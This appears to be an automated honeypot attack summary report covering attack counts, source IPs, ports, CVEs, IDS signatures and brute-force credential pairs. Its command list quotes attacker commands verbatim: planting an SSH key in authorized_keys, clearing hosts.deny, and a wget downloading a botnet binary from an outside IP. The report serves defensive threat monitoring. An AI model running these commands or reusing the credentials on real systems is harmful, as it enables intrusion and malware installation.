### **Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-15T21:01:37Z
**Timeframe:** 2025-10-15T20:20:01Z to 2025-10-15T21:00:02Z

**Files Used to Generate Report:**
*   agg_log_20251015T202001Z.json
*   agg_log_20251015T204001Z.json
*   agg_log_20251015T210002Z.json

### **Executive Summary**

This report summarizes 21,465 attacks recorded by the honeypot network. The majority of attacks were captured by the Honeytrap, Sentrypeer, and Dionaea honeypots. The most targeted service was SMB on port 445. A significant number of shell commands were executed, indicating attempts to establish control over the compromised systems. Multiple CVEs were targeted, including older vulnerabilities. The top attacking IP addresses originate from various geographic locations.

### **Detailed Analysis**

**Attacks by Honeypot:**
*   Honeytrap: 5028
*   Sentrypeer: 3645
*   Dionaea: 3125
*   Cowrie: 3435
*   Suricata: 2710
*   Mailoney: 1682
*   Ciscoasa: 1593
*   Tanner: 98
*   Redishoneypot: 57
*   ElasticPot: 31
*   H0neytr4p: 16
*   ConPot: 13
*   Adbhoney: 11
*   Ipphoney: 8
*   Honeyaml: 10
*   Dicompot: 3

**Top Attacking IPs:**
*   202.179.31.242: 3223
*   188.246.224.87: 1684
*   206.191.154.180: 1326
*   185.243.5.121: 1259
*   86.54.42.238: 822
*   105.96.9.30: 656
*   47.116.214.122: 394
*   106.37.72.112: 575
*   23.94.26.58: 855
*   92.191.96.115: 371
*   172.86.95.115: 497
*   172.86.95.98: 494
*   62.141.43.183: 322
*   85.209.134.43: 293
*   173.249.52.138: 272

**Top Targeted Ports/Protocols:**
*   5060: 3645
*   445: 3083
*   25: 1682
*   22: 474
*   5903: 235
*   80: 103
*   5901: 115
*   8333: 110
*   6379: 51
*   9200: 30
*   UDP/5060: 92

**Most Common CVEs:**
*   CVE-2019-11500
*   CVE-2021-3449
*   CVE-2002-0013
*   CVE-2002-0012
*   CVE-1999-0517
*   CVE-2018-14847

**Commands Attempted by Attackers:**
*   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
*   `lockr -ia .ssh`
*   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
*   `cat /proc/cpuinfo | grep name | wc -l`
*   `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
*   `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
*   `ls -lh $(which ls)`
*   `which ls`
*   `crontab -l`
*   `w`
*   `uname -m`
*   `top`
*   `uname`
*   `uname -a`
*   `whoami`
*   `lscpu | grep Model`
*   `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
*   `Enter new UNIX password:`
*   `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
*   `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

**Signatures Triggered:**
*   ET SCAN MS Terminal Server Traffic on Non-standard Port
*   ET DROP Dshield Block Listed Source group 1
*   ET HUNTING RDP Authentication Bypass Attempt
*   ET SCAN NMAP -sS window 1024
*   ET INFO Reserved Internal IP Traffic
*   ET SCAN Potential SSH Scan
*   ET VOIP Possible Inbound VOIP Scan/Misuse With User-Agent Zoiper
*   ET VOIP Modified Sipvicious Asterisk PBX User-Agent
*   ET SCAN Suspicious inbound to PostgreSQL port 5432
*   ET CINS Active Threat Intelligence Poor Reputation IP group 46

**Users / Login Attempts:**
*   345gs5662d34/345gs5662d34
*   config/config2013
*   default/123321
*   ubnt/1q2w3e
*   root/1234567890
*   support/159753
*   admin/toor
*   debian/5555
*   root/3245gs5662d34
*   unknown/techsupport

**Files Uploaded/Downloaded:**
*   search_children.js
*   11
*   fonts.gstatic.com
*   css?family=Libre+Franklin...
*   ie8.css?ver=1.0
*   html5.js?ver=3.7.3
*   sh
*   json
*   arm.urbotnetisass
*   discovery
*   soap-envelope

**HTTP User-Agents:**
*   (No data in logs)

**SSH Clients:**
*   (No data in logs)

**SSH Servers:**
*   (No data in logs)

**Top Attacker AS Organizations:**
*   (No data in logs)

### **Key Observations and Anomalies**

*   A high volume of attacks targeting SMB (port 445) and SIP (port 5060) was observed.
*   The commands executed by attackers suggest a focus on reconnaissance and establishing persistent access. The use of `chattr` and modification of `.ssh/authorized_keys` are common techniques.
*   The presence of commands related to downloading and executing files (e.g., `wget`, `curl`) indicates attempts to install malware.
*   The variety of CVEs targeted, including some that are quite old, suggests that attackers are using automated tools to scan for a wide range of vulnerabilities.

This concludes the Honeypot Attack Summary Report.